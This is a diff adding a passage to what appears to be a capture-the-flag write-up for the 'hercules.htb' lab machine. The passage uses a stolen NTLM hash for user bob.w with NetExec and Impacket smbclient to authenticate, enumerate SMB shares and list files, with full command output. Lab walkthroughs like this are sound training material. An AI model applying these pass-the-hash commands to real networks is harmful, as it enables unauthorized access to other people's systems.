@@ -822,3 +822,59 @@ SMB         dc.hercules.htb 445    dc               [+] hercules.htb\bob.w:8a65c
 
 This user is now compromised!
 
+# Access on shares as `bob.w`
+
+```python
+nxc smb dc.hercules.htb -u bob.w -H '8a65c74e8f0073babbfac6725c66cc3f' -k --shares
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\bob.w:8a65c74e8f0073babbfac6725c66cc3f 
+SMB         dc.hercules.htb 445    dc               [*] Enumerated shares
+SMB         dc.hercules.htb 445    dc               Share           Permissions     Remark
+SMB         dc.hercules.htb 445    dc               -----           -----------     ------
+SMB         dc.hercules.htb 445    dc               ADMIN$                          Remote Admin
+SMB         dc.hercules.htb 445    dc               C$                              Default share
+SMB         dc.hercules.htb 445    dc               Department      READ            
+SMB         dc.hercules.htb 445    dc               IPC$            READ            Remote IPC
+SMB         dc.hercules.htb 445    dc               NETLOGON        READ            Logon server share 
+SMB         dc.hercules.htb 445    dc               Reports         READ            
+SMB         dc.hercules.htb 445    dc               SYSVOL          READ            Logon server share 
+SMB         dc.hercules.htb 445    dc               Users           READ
+```
+
+I now have more access on SMB shares
+
+```python
+smbclient.py hercules.htb/bob.w@dc.hercules.htb -hashes ':8a65c74e8f0073babbfac6725c66cc3f' -k -no-pass
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+Type help for list of commands
+# shares
+Share Name                Type            Comment
+----------------------------------------------------------------------
+ADMIN$                    DISK (SPECIAL)  Remote Admin
+C$                        DISK (SPECIAL)  Default share
+Department                DISK            
+IPC$                      IPC (SPECIAL)   Remote IPC
+NETLOGON                  DISK            Logon server share 
+Reports                   DISK            
+SYSVOL                    DISK            Logon server share 
+Users                     DISK            
+# use Department
+# ls
+drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 .
+drw-rw-rw-          0  Wed Dec  4 01:45:11 2024 ..
+drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Engineering Department
+drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 IT
+drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Recruitment
+drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Security Department
+drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Web Department
+# use Reports
+# ls
+drw-rw-rw-          0  Tue Sep 15 20:39:28 2026 .
+drw-rw-rw-          0  Thu Oct  9 15:56:58 2025 ..
+-rw-rw-rw-         97  Tue Sep 15 20:39:05 2026 .~lock.a9987c8f-6986-4211-a8f2-0e4c2096a0d1.odt#
+-rw-rw-rw-         97  Tue Sep 15 20:33:14 2026 .~lock.da81e5c9-f25e-46e0-94cd-e4567d87c6af.odt#
+# 
+```
+
